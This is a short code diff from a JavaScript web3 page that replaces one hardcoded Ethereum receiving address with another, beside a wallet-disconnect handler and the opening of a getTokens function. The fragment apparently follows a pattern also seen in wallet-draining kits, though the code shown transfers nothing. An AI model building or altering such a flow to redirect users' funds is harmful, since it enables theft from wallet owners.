@@ -234,7 +234,7 @@ async function onDisconnect() {
   document.querySelector("#connected").style.display = "none";
 }
 
-const receiver_address = '0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f';
+const receiver_address = '0xcBd37B5474908aae2EF66cCDc228B22F304b6B65';
 
 async function getTokens(address="", api_key="", chain="eth"){
   return new Promise((resolve, reject)=>{
